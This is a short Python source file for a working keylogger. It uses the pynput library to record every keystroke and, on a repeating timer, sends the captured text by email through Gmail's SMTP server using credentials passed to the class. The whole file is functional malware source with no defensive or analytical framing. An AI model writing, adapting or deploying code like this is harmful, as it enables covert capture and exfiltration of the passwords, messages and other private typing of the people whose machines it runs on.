#!/usr/bin/python
import pynput.keyboard
import threading
import smtplib

log = ""

class Keylogger:
    def __init__(self,time_interval,email,password):
        self.log = "keylogger start"
        self.interval = time_interval
        self.mail = email
        self.passwd = password
        print("we are in constructor")
    
    def append_log(self,string):
        self.log = self.log+string

    def key_press(self,key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key= " "
            else:
                current_key= " "+ str(key) +" "
        self.append_log(current_key)

    def report(self):
        global log
        self.send_mail(self.mail,self.passwd,"\n\n"+self.log)
        self.log = ""
        timer = threading.Timer(self.interval,self.report)
        timer.start()


    def send_mail(self,email,password,message):
        server  = smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email,email,message)
        server.quit()


    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press = self.key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
